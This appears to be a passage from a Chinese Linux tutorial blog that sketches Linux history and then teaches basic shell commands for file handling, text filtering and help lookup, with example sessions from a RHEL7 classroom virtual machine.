有改进该软件，以及向公众发布改进的自由，这样整个社群都可受惠（自由之三）。取得该软件源码为达成此目的之前提。 LinuxLinux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的UNIX工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux操作系统诞生于1991 年10 月5 日（这是第一次正式向外公布时间）。Linux存在着许多不同的Linux版本，但它们都使用了Linux内核。Linux可安装在各种计算机硬件设备中，比如手机、平板电脑、路由器、视频游戏控制台、台式计算机、大型机和超级计算机。 严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。 Linux简史Linux 操作系统的诞生、发展和成长过程始终依赖着五个重要支柱：UNIX 操作系统、MINIX 操作系统、GNU计划、POSIX 标准和Internet 网络。 1981 年IBM公司推出微型计算机IBM PC。 1991年，GNU计划已经开发出了许多工具软件，最受期盼的GNU C编译器已经出现，GNU的操作系统核心HURD一直处于实验阶段，没有任何可用性，实质上也没能开发出完整的GNU操作系统，但是GNU奠定了Linux用户基础和开发环境。 1991年初，林纳斯·托瓦兹开始在一台386sx兼容微机上学习minix操作系统。1991年4月，林纳斯·托瓦兹开始酝酿并着手编制自己的操作系统。 1991 年4 月13 日在comp.os.minix 上发布说自己已经成功地将bash 移植到了minix 上，而且已经爱不释手、不能离开这个shell 软件了。 1991年7月3日，第一个与Linux有关的消息是在comp.os.minix上发布的（当然此时还不存在Linux这个名称，当时林纳斯·托瓦兹的脑子里想的可能是FREAX，FREAX的英文含义是怪诞的、怪物、异想天开等）。 1991年的10月5日，林纳斯·托瓦兹在comp.os.minix新闻组上发布消息，正式向外宣布Linux内核的诞生（Freeminix-like kernel sources for 386-AT）。 1993年，大约有100余名程序员参与了Linux内核代码编写/修改工作，其中核心组由5人组成，此时Linux 0.99的代码大约有十万行，用户大约有10万左右。 1994年3月，Linux1.0发布，代码量17万行，当时是按照完全自由免费的协议发布，随后正式采用GPL协议。 1995年1月，Bob Young创办了RedHat（小红帽），以GNU/Linux为核心，集成了400多个源代码开放的程序模块，搞出了一种冠以品牌的Linux，即RedHat Linux,称为Linux”发行版”，在市场上出售。这在经营模式上是一种创举。 1996年6月，Linux 2.0内核发布，此内核有大约40万行代码，并可以支持多个处理器。此时的Linux已经进入了实用阶段，全球大约有350万人使用。 1998年2月，以Eric Raymond为首的一批年轻的”老牛羚骨干分子”终于认识到GNU/Linux体系的产业化道路的本质，并非是什么自由哲学，而是市场竞争的驱动，创办了”Open Source Intiative”（开放源代码促进会）”复兴”的大旗，在互联网世界里展开了一场历史性的Linux产业化运动。 2001年1月，Linux 2.4发布，它进一步地提升了SMP系统的扩展性，同时它也集成了很多用于支持桌面系统的特性：USB，PC卡（PCMCIA）的支持，内置的即插即用，等等功能。 2003年12月，Linux 2.6版内核发布，相对于2.4版内核2.6在对系统的支持都有很大的变化。 2004年的第1月，SuSE嫁到了Novell，SCO继续顶着骂名四处强行“化缘”， Asianux，MandrakeSoft也在五年中首次宣布季度赢利。3月，SGI宣布成功实现了Linux操作系统支持256个Itanium 2处理器。","link":"/2016/12/22/booboo_linux_base/00-linux_history/"},{"title":"Linux 基础命令","text":"在教室物理机包括rhel7和rhel6两台实验虚拟机，上打开虚拟机命令: rht-vmctl start rhel7 在物理机上远程登陆到虚拟机rhel7 ssh root@rhel7-fN ，N 为你的机器编号， root密码都是uplooking，系统中有一个普通用户student，其密码为student。 在虚拟机中关闭虚拟机的命令为shutdown -h now，也可以在物理机上执行rht-vmctl poweroff rhel7。 在物理机上设置录屏视频，由于Gnome3的bug会有30秒时间限制，修正时间限制的命令如下： 1[kiosk@fundation0 ~]$ gsettings set org.gnome.settings-daemon.plugins.media-keys max-screencast-length &quot;uint32 0&quot; 命令简介命令的构成命令字 选项 参数 命令分:内部命令、外部命令; 选项: - 单个字符 – 多个字符 参数:对谁执行这个命令,可以有多个,选项和参数可以互换位置 命令使用的原因Shell是系统的用户界面，提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行。实际上Shell是一个命令解释器，它解释由用户输入的命令并且把它们送到内核。从这里开始学习Linux命令，本课程让你更清楚地了解和掌握它，在Linux中命令是讲究大小写的。使用命令即快速又能减少机器的性能消耗。 命令提示符 # root 用户 $ 一般用户 [ 用户的身份 @ 主机名 当前位置 ] 当前位置显示的是目录名 123456789101112[root@rhel7 ~]# hostnamewww.dabao.com[root@rhel7 ~]# groupadd tom[root@rhel7 ~]# useradd -g tom tom[root@rhel7 ~]# id tomuid=501(tom) gid=501(tom) groups=501(tom)[root@rhel7 ~]# su - tom[tom@rhel7 ~]$ whoroot tty12016-03-20 23:56 (:0)root pts/02016-03-21 00:39 (:0.0) 常用的命令ls 常用参数 含义及用法 -l long 的缩写 详细列出当前目录下的所有文件属性 七列 文件名 &lt;=255 个字符 -d directory 的缩写 查看当前目录本身的信息 -h 以人性化的方式显示文件大小,录的大小并不代表目录内所有文件的大小 du -sh /etc&lt;== 查看 etc 目录真正的大小 -a 查看隐藏文件 以 . 开头的文件 -R 查看多层目录 -b 特殊字符将以 \\ 分割 ls 查看有特殊字符的文件 ls实验1234567891011121314151617181920212223242526[tom@rhel7 tmp]$ ls -hltotal 68Ksrwxr-xr-x. 1 root root 0 Mar 20 23:59 gedit.root.3177893063drwx------. 2 root root 4.0K Feb 5 18:24 keyring-JL7MKY[tom@rhel7 tmp]$ ls -ld /tmpdrwxrwxrwt. 22 root root 4096 Mar 21 00:43 /tmp[tom@rhel7 tmp]$ ls -la /tmptotal 96drwxrwxrwt. 22 root root 4096 Mar 21 00:43 .dr-xr-xr-x. 29 root root 4096 Mar 20 23:55 ..drwx------. 2 root root 4096 Mar 20 23:56 .esd-0drwx------. 2 cong cong 4096 Jan 1 18:33 .esd-500[tom@rhel7 tmp]$ ls -bl-rw-rw-r--. 1 tom tom 0 Mar 21 00:48 a\\ b.txt[tom@rhel7 tmp]$ ls -l-rw-rw-r--. 1 tom tom 0 Mar 21 00:48 a b.txt[tom@rhel7 tmp]$ mkdir -p a/b/c[tom@rhel7 tmp]$ ls -lR a/a/:total 4drwxrwxr-x. 3 tom tom 4096 Mar 21 00:50 ba/b:total 4drwxrwxr-x. 2 tom tom 4096 Mar 21 00:50 ca/b/c:total 0 cd cd change directory 切换工作目录 绝对路径 以根为起始的路径 相对路径 ~当前用户的家目录 ;. 当前目录 ;.. 上一层用户 ;- 回到上一次所在位置 cd实验123456[tom@rhel7 tmp]$ cd /etc/[tom@rhel7 etc]$ cd ~[tom@rhel7 ~]$ cd .[tom@rhel7 ~]$ cd ..[tom@rhel7 home]$ cd -/home/tom pwdpwd:print working directory 显示当前所在位置的绝对路径 pwd实验1234[tom@rhel7 tmp]$ cd /etc/nginx[tom@rhel7 nginx]$ cd conf.d[tom@rhel7 conf.d]$ pwd/etc/nginx/conf.d 符号通配符 *匹配任意多个字符 例如：a* 包括aa*、ab*、ac* 等等 通配符 ?匹配任意单个字符例如： a? 可以是ab、ac、ad、a1、a9、a#等等 *？实验12345rm -f *1rm -f 1*rm -f 1*1rm -f test?想删除 test 后面有一个字符的文件 | 管道output | input 对某些命令执行的结果去作操作,会用到管道；用于命令与命令之间的连接，前一个命令的输出是后一个命令的输入 | 管道实验详细列出 /tmp 目录下的文件,并截取以空格为分割的第三列 12345678910[tom@rhel7 ~]$ ls -l /tmp|cut -d&quot; &quot; -f3tomtomrootrootroot详细列出 /tmp 目录下的文件,截取含有关键字 tom 的行,再截取以空格为分割的第一列内容[tom@rhel7 ~]$ ls -l /tmp|grep tom|cut -d&quot; &quot; -f1drwxrwxr-x.-rw-rw-r--. 针对文件的的基本操作touchtouch [filename] 创建文件,参数可以跟多个 如果要创建 50 个有规律的文件,例如 text1-text50 利用参数扩展 123touch test{1..50}touch test{a..e}touch test{a..e}_{1..3}---&gt; 会创建 a_1 a_2 a_3... 上帝之手,本来是用来修改文件时间戳的。文件的三个时间 ctime\\mtime\\atime 拓展内容：可以通过“stat”命令查看文件的三个时间 touch “ “ 可以放一些特殊字符 touch实验1234567891011121314151617181920212223242526272829[tom@rhel7 ~]$ touch test{a..c}_{1..4}[tom@rhel7 ~]$ lstesta_1 testa_4 testb_3 testc_2testa_2 testb_1 testb_4 testc_3testa_3 testb_2 testc_1 testc_4--full-time可以查看mtime的完整时间[tom@rhel7 ~]$ ls -l --full-timetotal 0-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testa_1-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testa_2-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testa_3-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testa_4-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testb_1-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testb_2-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testb_3-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.853039590 +0800 testb_4-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.854039544 +0800 testc_1-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.854039544 +0800 testc_2-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.854039544 +0800 testc_3-rw-rw-r--. 1 tom tom 0 2016-03-21 01:31:22.854039544 +0800 testc_4[tom@rhel7 ~]$ touch &quot;ab cd&quot;[tom@rhel7 ~]$ ls -bab\\ \\ \\ cd testa_3 testb_2 testc_1 testc_4testa_1 testa_4 testb_3 testc_2testa_2 testb_1 testb_4 testc_3 touch拓展实验1234567891011121314[booboo@rhel7 ~]$ touch booboo[booboo@rhel7 ~]$ lltotal 0-rw-rw-r--. 1 booboo booboo 0 Jun 15 23:28 booboo[booboo@rhel7 ~]$ stat booboo File: ‘booboo’ Size: 0 Blocks: 0 IO Block: 4096 regular empty fileDevice: fd01h/64769d Inode: 143 Links: 1Access: (0664/-rw-rw-r--) Uid: ( 1001/ booboo) Gid: ( 1001/ booboo)Context: unconfined_u:object_r:user_home_t:s0Access: 2016-06-15 23:28:55.041578819 -0400 #atime 文件最近一次被访问的时间Modify: 2016-06-15 23:28:55.041578819 -0400 #mtime 文件内容最近一次修改的时间Change: 2016-06-15 23:28:55.041578819 -0400 #ctime 文件属性最近一次修改的时间 Birth: - 使用cat去访问booboo文件，可以发现atime被修改了 1234567891011[booboo@rhel7 ~]$ cat booboo[booboo@rhel7 ~]$ stat booboo File: ‘booboo’ Size: 0 Blocks: 0 IO Block: 4096 regular empty fileDevice: fd01h/64769d Inode: 143 Links: 1Access: (0664/-rw-rw-r--) Uid: ( 1001/ booboo) Gid: ( 1001/ booboo)Context: unconfined_u:object_r:user_home_t:s0Access: 2016-06-15 23:32:35.898724748 -0400Modify: 2016-06-15 23:28:55.041578819 -0400Change: 2016-06-15 23:28:55.041578819 -0400 Birth: - 通过chmod修改文件权限后，会看到ctime时间改变，通过ll命令看到的时间为mtime 1234567891011121314[booboo@rhel7 ~]$ chmod 777 booboo[booboo@rhel7 ~]$ lltotal 0-rwxrwxrwx. 1 booboo booboo 0 Jun 15 23:28 booboo [booboo@rhel7 ~]$ stat booboo File: ‘booboo’ Size: 0 Blocks: 0 IO Block: 4096 regular empty fileDevice: fd01h/64769d Inode: 143 Links: 1Access: (0777/-rwxrwxrwx) Uid: ( 1001/ booboo) Gid: ( 1001/ booboo)Context: unconfined_u:object_r:user_home_t:s0Access: 2016-06-15 23:32:35.898724748 -0400Modify: 2016-06-15 23:28:55.041578819 -0400Change: 2016-06-15 23:33:49.195445761 -0400 Birth: - 通过echo命令向booboo文件追加一些内容，会看到mtime时间变了，并且ctime也变了，思考为什么？ 1234567891011121314[booboo@rhel7 ~]$ echo hi &gt;&gt; booboo[booboo@rhel7 ~]$ lltotal 4-rwxrwxrwx. 1 booboo booboo 3 Jun 15 23:34 booboo[booboo@rhel7 ~]$ stat booboo File: ‘booboo’ Size: 3 Blocks: 8 IO Block: 4096 regular fileDevice: fd01h/64769d Inode: 143 Links: 1Access: (0777/-rwxrwxrwx) Uid: ( 1001/ booboo) Gid: ( 1001/ booboo)Context: unconfined_u:object_r:user_home_t:s0Access: 2016-06-15 23:32:35.898724748 -0400Modify: 2016-06-15 23:34:53.251332183 -0400Change: 2016-06-15 23:34:53.251332183 -0400 Birth: - rm rm [filename] remove 删除文件,对 root 用户有提示,普通用户没有提示 -f force 强制删除, root 无提示 -i 普通用户有提示的删除 -r 递归删除,慎重使用 -rf rm实验普通用户 tom 123[tom@rhel7 ~]$ rm testa_1[tom@rhel7 ~]$ rm -i testa_2rm: remove regular empty file `testa_2&apos;? Y root 用户123[root@rhel7 ~]# rm a.testrm: remove regular empty file `a.test&apos;? Y[root@rhel7 ~]# rm -f b.test 普通用户 tom1234[tom@rhel7 ~]$ mkdir -p a/b/c[tom@rhel7 ~]$ rm a/rm: cannot remove `a/&apos;: Is a directory[tom@rhel7 ~]$ rm -r a/ mkdirmkdir:make directory 创建目录 mkdir -p /test/test1 递归创建目录 mkdir {a..e} 创建 a-e 的目录 touch {a..e}/file{1..4} 在 a-e 的目录下新建 file1-file4 文件 mkdir实验12345678910111213141516171819202122232425262728293031323334353637[tom@rhel7 ~]$ mkdir -p test/test1[tom@rhel7 ~]$ lsab cd testa_3 testb_2 testc_1 testc_4p testa_4 testb_3 testc_2test testb_1 testb_4 testc_3[tom@rhel7 ~]$ mkdir {a..f}[tom@rhel7 ~]$ lsa d test testb_2 testc_2ab cd e testa_3 testb_3 testc_3b f testa_4 testb_4 testc_4 c p testb_1 testc_1[tom@rhel7 ~]$ touch {a..f}/file{1..4}[tom@rhel7 ~]$ lsa d test testb_2 testc_2ab cd e testa_3 testb_3 testc_3b f testa_4 testb_4 testc_4 c p testb_1 testc_1[tom@rhel7 ~]$ ls -rR.:testc_4 testb_4 testa_4 f btestc_3 testb_3 testa_3 e ab cdtestc_2 testb_2 test d atestc_1 testb_1 p c./test:test1./test/test1:./p:./f:file4 file3 file2 file1./e:file4 file3 file2 file1./d:file4 file3 file2 file1./c:file4 file3 file2 file1./b:file4 file3 file2 file1./a:file4 file3 file2 file1 rmdirrmdir:remove directory 删除目录 只能删除空目录,出于安全性的考虑 rm -rf [d_name] 可以删除非空目录 rmdir 实验12345678910111213[booboo@rhel7 ~]$ mkdir aa[booboo@rhel7 ~]$ mkdir -p cc/bb[booboo@rhel7 ~]$ rmdir aa[booboo@rhel7 ~]$ lltotal 4-rwxrwxrwx. 1 booboo booboo 3 Jun 15 23:34 booboodrwxrwxr-x. 3 booboo booboo 15 Jun 16 00:08 cc[booboo@rhel7 ~]$ rmdir ccrmdir: failed to remove ‘cc’: Directory not empty[booboo@rhel7 ~]$ rm -rf cc[booboo@rhel7 ~]$ lltotal 4-rwxrwxrwx. 1 booboo booboo 3 Jun 15 23:34 booboo cpcp:copy 复制文件 cp 源文件 目的地(目录) -p 保留文件原属性 -r 复制目录 cp实验12345678910111213141516171819使用 root 用户,进入 tom 的家目录[root@rhel7 ~]# cd /home/tom保留原文件属性复制 testa_3 文件到 /tmp 目录下[root@rhel7 tom]# cp -p testa_3 /tmp[root@rhel7 tom]# ll /tmp/testa_3-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 /tmp/testa_3[root@rhel7 tom]# cp testa_4 /tmp[root@rhel7 tom]# ll /tmp/testa_4-rw-r--r--. 1 root root 0 Mar 21 01:55 /tmp/testa_4拷贝目录 a 到 /tmp 下,必须加上 -r ,因为 a 目录下还有 b/c 目录[root@rhel7 tom]# cp a /tmpcp: omitting directory `a&apos;[root@rhel7 tom]# cp -r a /tmp mvmv:move 移动 移动和重命名 mv 源文件 目的地(目录) mv实验123456789101112131415161718192021222324[tom@rhel7 ~]$ mv testa_3 test[tom@rhel7 ~]$ lsac f testa_4 testb_3 testc_2ab cd d p testb_1 testb_4 testc_3be test testb_2 testc_1 testc_4[tom@rhel7 ~]$ mv test??? f/[tom@rhel7 ~]$ ll -R ff:total 0-rw-rw-r--. 1 tom tom 0 Mar 21 01:47 file1-rw-rw-r--. 1 tom tom 0 Mar 21 01:47 file2-rw-rw-r--. 1 tom tom 0 Mar 21 01:47 file3-rw-rw-r--. 1 tom tom 0 Mar 21 01:47 file4-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testa_4-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testb_1-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testb_2-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testb_3-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testb_4-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testc_1-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testc_2-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testc_3-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testc_4 针对文件内容的基本操作文件的查看 文件 命令 解释 小文件 cat 以正序查看 调用内存比较多 -n 显示行号 tac 以倒序查看 调用内存比较多 大文件 head 查看文件首部，默认10行 ，-n 指定行号 tail 查看文件尾部，默认10行，-n指定行号 more 按空格 space 下一页 b 向上翻页 enter 下一行 less 比 more 多了一个搜索功能 /[ 需搜索的子段 ]N 向上查找 n 向下查 q 退出 文件查看实验1234567891011121314151617181920212223242526[tom@rhel7 ~]$ cat -n passwd1 root:x:0:0:root:/root:/bin/bash2 bin:x:1:1:bin:/bin:/sbin/nologin3 daemon:x:2:2:daemon:/sbin:/sbin/nologin4 adm:x:3:4:adm:/var/adm:/sbin/nologin5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin6 sync:x:5:0:sync:/sbin:/bin/sync7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown8 halt:x:7:0:halt:/sbin:/sbin/halt9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin10 cong:x:500:500:cong:/home/cong:/bin/bash11 nginx:x:496:491:Nginx web server:/var/lib/nginx:/sbin/nologin12 tom:x:501:501::/home/tom:/bin/bash[tom@rhel7 ~]$ tac passwdtom:x:501:501::/home/tom:/bin/bashnginx:x:496:491:Nginx web server:/var/lib/nginx:/sbin/nologincong:x:500:500:cong:/home/cong:/bin/bashmail:x:8:12:mail:/var/spool/mail:/sbin/nologinhalt:x:7:0:halt:/sbin:/sbin/haltshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownsync:x:5:0:sync:/sbin:/bin/synclp:x:4:7:lp:/var/spool/lpd:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinbin:x:1:1:bin:/bin:/sbin/nologinroot:x:0:0:root:/root:/bin/bash 文件的修改 软件 解释 LibreOffice .odt 结尾 类似于 windows office gedit 类似于 windows 记事本 vim 插入模式 后面会专门讲到 vim 编辑器的使用 退出模式 命令模式 echo 本身代表回显 echo xxx &gt; file 将 xxx 写入 file 文件,并覆盖原有内容 echo xxx &gt;&gt; file 在 file 文件追加 echo实验12345678910[booboo@rhel7 ~]$ echo hi &gt; file1[booboo@rhel7 ~]$ cat file1hi[booboo@rhel7 ~]$ echo booboo &gt; file1[booboo@rhel7 ~]$ cat file1booboo[booboo@rhel7 ~]$ echo hihihihi &gt;&gt; file1[booboo@rhel7 ~]$ cat file1booboohihihihi 文件的过滤grep 截取行 123456789101112131415grep [OPTIONS] PATTERN [FILE...]过滤带有 [ 字符串 ] 的行grep [ 字符串 ] [ 文件 ] 过滤以 [ 字符串 ] 为开始的行grep [^ 字符串 ] [ 文件 ]过滤以 [ 字符串 ] 为结尾的行grep [ 字符串 $] [ 文件 ]过滤反选grep -v [ 字符串 ] [ 文件 ]eg.过滤以 root 为开始的行 grep ^root /etc/passwd过滤以 bash 为结尾的行grep bash$ /etc/passwd cut 截取列 12cut -d&quot; 分割符 &quot;( 以什么为分隔符 ) -fn( 第几列 ) [ 文件 ]eg. cut -d&quot;:&quot; -f2 /etc/resolv.conf wc 统计 1234567wc 行数 单词数 字符数 文件名-l 只显示行数-w, --words 显示单词数-c, -m,--bytes 显示字节eg.[root@stu15 ~]# wc /etc/resolv.conf 、4 11 98 /etc/resolv.conf sort 排序 12345678默认按照首字母 ACII 码-n 按照数字大小排序-u 剔除重复的行-r 降序排列-k 指定某一列-t 分隔符eg.sort -n -k 2 -t : file1 将 file1 以第二列的数字排序,列以:分割 uniq 剔除重复行 uniq [file_name] 文件过滤实验123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990grep[booboo@rhel7 ~]$ grep root passwdroot:x:0:0:root:/root:/bin/bashoperator:x:11:0:operator:/root:/sbin/nologin[booboo@rhel7 ~]$ grep ^booboo passwdbooboo:x:1001:1001::/home/booboo:/bin/bash[booboo@rhel7 ~]$ grep ^root passwdroot:x:0:0:root:/root:/bin/bash[booboo@rhel7 ~]$ grep bash$ passwdroot:x:0:0:root:/root:/bin/bashstudent:x:1000:1000:student:/home/student:/bin/bashbooboo:x:1001:1001::/home/booboo:/bin/bash[booboo@rhel7 ~]$ grep -v nologin passwdroot:x:0:0:root:/root:/bin/bashsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltstudent:x:1000:1000:student:/home/student:/bin/bashbooboo:x:1001:1001::/home/booboo:/bin/bashcut[booboo@rhel7 ~]$ cut -d&quot;:&quot; -f1 passwdrootbindaemonadmlpsyncshutdownhaltmailwc[booboo@rhel7 ~]$ wc passwd 42 72 2121 passwd[booboo@rhel7 ~]$ wc -l passwd42 passwd[booboo@rhel7 ~]$ wc -w passwd72 passwd[booboo@rhel7 ~]$ wc -c passwd2121 passwdsort[booboo@rhel7 ~]$ vi num[booboo@rhel7 ~]$ cat numbooboo 20 100tom 21 100tom 21 100kevin 19 200booboo 20 100mark 20 200[booboo@rhel7 ~]$ sort numbooboo 20 100booboo 20 100kevin 19 200mark 20 200tom 21 100tom 21 100[booboo@rhel7 ~]$ sort -r numtom 21 100tom 21 100mark 20 200kevin 19 200booboo 20 100booboo 20 100[booboo@rhel7 ~]$ sort -u numbooboo 20 100kevin 19 200mark 20 200tom 21 100[booboo@rhel7 ~]$ sort -n -k 2 -t &quot; &quot; num |sort -ubooboo 20 100kevin 19 200mark 20 200tom 21 100uniq[booboo@rhel7 ~]$ uniq numbooboo 20 100tom 21 100kevin 19 200booboo 20 100mark 20 200 帮助命令 命令 解释 type [ 命令 ] 判断是内部命令 or 外部命令 –help 外部命令 help 只针对系统内部命令 man [] 内容清晰、详细,在线文档,支持搜索( /name ) man [ 章节 ] [name] info [] 太详细 /usr/share/doc 存放帮助文档,在与软件同名的目录下有所有软件的使用文档 man和—help以及help的区别 man命令 系统中会有单独的man文件，就是说，如果系统没有安装对应man文件，哪怕命令完全正常，man都没结果（同样，只要安装了man文件，哪怕没命令，也可以得到一大堆东西）。 –help参数将会显示可执行程序自带的信息，这些信息是嵌入到程序本身的，所以–help信息较简短。 help命令是选项帮助命令，顾名思义 你可以把单独某个命令的某个选项列出来，方便快捷很多，省去了man当中查找的繁琐，但是help只支持shell的内部命令。内部命令即存储在shell内部可以直接调用的一些简单命令，比如说echo，cd，pwd等。 typetype命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。 12345678910111213141516171819202122232425262728293031语法type(选项)(参数)选项-t：输出“file”、“alias”或者“builtin”，分别表示给定的指令为“外部指令”、“命令别名”或者“内部指令”；-p：如果给出的指令为外部指令，则显示其绝对路径；-a：在环境变量“PATH”指定的路径中，显示给定指令的信息，包括命令别名。 参数 指令：要显示类型的指令。参数关键字：指定要搜索帮助的关键字命令类型alias：别名keyword：关键字，Shell保留字function：函数，Shell函数builtin：内建命令，Shell内建命令file：文件，磁盘文件，外部命令unfound：没有找到尝试几个命令man,ls,touch,echo,cat[booboo@rhel7 ~]$ type manman is /bin/man[booboo@rhel7 ~]$ type lsls is aliased to `ls –color=auto&apos;[booboo@rhel7 ~]$ which lsalias ls=&apos;ls --color=auto&apos; /bin/ls[booboo@rhel7 ~]$ type touchtouch is hashed (/bin/touch)[booboo@rhel7 ~]$ type echoecho is a shell builtin[booboo@rhel7 ~]$ type catcat is hashed (/bin/cat)内置命令一般显示为“is a shell builtin ” 除了内置命令外，其他命令都是通过某个安装包安装生成的可执行文件 接下来我们一起看看这些命令都是什么软件生成的 12345678910[booboo@rhel7 ~]$ rpm -qf /bin/manman-db-2.6.3-9.el7.x86_64[booboo@rhel7 ~]$ rpm -qf /bin/lscoreutils-8.22-11.el7.x86_64[booboo@rhel7 ~]$ rpm -qf /bin/touchcoreutils-8.22-11.el7.x86_64[booboo@rhel7 ~]$ rpm -qf /bin/catcoreutils-8.22-11.el7.x86_64[booboo@rhel7 ~]$ type ifif is a shell keyword –help 参数–help参数是大所数命令自带的选项，用于查看使用帮助。 123456789101112131415161718192021222324[booboo@rhel7 ~]$ ls --helpUsage: ls [OPTION]... [FILE]...List information about the FILEs (the current directory by default).Sort entries alphabetically if none of -cftuvSUX nor --sort is specified.Mandatory arguments to long options are mandatory for short options too. -a, --all do not ignore entries starting with . -A, --almost-all do not list implied . and .. --author with -l, print the author of each file -b, --escape print C-style escapes for nongraphic characters --block-size=SIZE scale sizes by SIZE before printing them; e.g., &apos;--block-size=M&apos; prints sizes in units of 1,048,576 bytes; see SIZE format below -B, --ignore-backups do not list implied entries ending with ~ -c with -lt: sort by, and show, ctime (time of last modification of file status information); with -l: show ctime and sort by name; otherwise: sort by ctime, newest first -C list entries by columns --color[=WHEN] colorize the output; WHEN can be &apos;never&apos;, &apos;auto&apos;, or &apos;always&apos; (the default); more info below -d, --directory list directories themselves, not their contents -D, --dired generate output designed for Emacs&apos; dired mode -f do not sort, enable -aU, disable -ls --color helphelp只支持shell的内部命令。内部命令即存储在shell内部可以直接调用的一些简单命令,例如cd,echo,help等。 help(选项)(参数)-s：输出短格式的帮助信息。仅包括命令格式。 123456789101112131415161718192021222324252627282930313233343536[booboo@rhel7 ~]$ type cdcd is a shell builtin[booboo@rhel7 ~]$ help cdcd: cd [-L|[-P [-e]]] [dir] Change the shell working directory. Change the current directory to DIR. The default DIR is the value of the HOME shell variable. The variable CDPATH defines the search path for the directory containing DIR. Alternative directory names in CDPATH are separated by a colon (:). A null directory name is the same as the current directory. If DIR begins with a slash (/), then CDPATH is not used. If the directory is not found, and the shell option `cdable_vars&apos; is set, the word is assumed to be a variable name. If that variable has a value, its value is used for DIR. Options: -L force symbolic links to be followed -P use the physical directory structure without following symbolic links -e if the -P option is supplied, and the current working directory cannot be determined successfully, exit with a non-zero status The default is to follow symbolic links, as if `-L&apos; were specified. Exit Status: Returns 0 if the directory is changed, and if $PWD is set successfully when -P is used; non-zero otherwise.[booboo@rhel7 ~]$ type touchtouch is hashed (/bin/touch)[booboo@rhel7 ~]$ type echoecho is a shell builtin[booboo@rhel7 ~]$ help echoecho: echo [-neE] [arg ...] manman命令是Linux下的帮助指令，通过man指令可以查看Linux中的指令帮助、配置文件帮助和编程帮助等信息。 12345678910语法man(选项)(参数)选项-a：在所有的man帮助手册中搜索；-f：等价于whatis指令，显示给定关键字的简短描述信息；-P：指定内容时使用分页程序；-M：指定man手册搜索的路径。参数数字：指定从哪本man手册中搜索帮助关键字：指定要搜索帮助的关键字 例如输入man ls，它会在左上角显示“ECHO(1)”“ECHO”代表手册名称；“(1)”代表 表示该手册位于第一节章1）”表示该手册位于第一节章，同样，我们输man ifconfig它会在最左上角显示“IFCONFIG（8）”。也可以这样输入命令：“man [章节号] 手册名称”。 man是按照手册的章节号的顺序进行搜索的，比如： man sleep 只会显示sleep命令的手册,如果想查看库函数sleep，就要输入: man 3 sleep 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374[booboo@rhel7 ~]$ man echo|catECHO(1) User Commands ECHO(1)#此处“ECHO”代表手册名称；“（1）”代表 表示该手册位于第一节章NAME echo - display a line of textSYNOPSIS echo [SHORT-OPTION]... [STRING]... echo LONG-OPTIONDESCRIPTION Echo the STRING(s) to standard output. -n do not output the trailing newline -e enable interpretation of backslash escapes -E disable interpretation of backslash escapes (default) --help display this help and exit --version output version information and exit If -e is in effect, the following sequences are recognized: \\\\ backslash \\a alert (BEL) \\b backspace \\c produce no further output \\e escape \\f form feed \\n new line \\r carriage return \\t horizontal tab \\v vertical tab \\0NNN byte with octal value NNN (1 to 3 digits) \\xHH byte with hexadecimal value HH (1 to 2 digits) NOTE: your shell may have its own version of echo, which usually supersedes the version described here. Please refer to your shell&apos;s documentation for details about the options it supports. GNU coreutils online help: &lt;http://www.gnu.org/software/coreutils/&gt; Report echo translation bugs to &lt;http://translationproject.org/team/&gt;AUTHOR Written by Brian Fox and Chet Ramey.COPYRIGHT Copyright © 2013 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.SEE ALSO The full documentation for echo is maintained as a Texinfo manual. If the info and echo programs are properly installed at your site, the command info coreutils &apos;echo invocation&apos; should give you access to the complete manual.GNU coreutils 8.22 January 2014 ECHO(1) info（作为拓展内容）info命令是Linux下info格式的帮助指令。 就内容来说，info页面比man page编写得要更好、更容易理解，也更友好，但man page使用起来确实要更容易得多。一个man 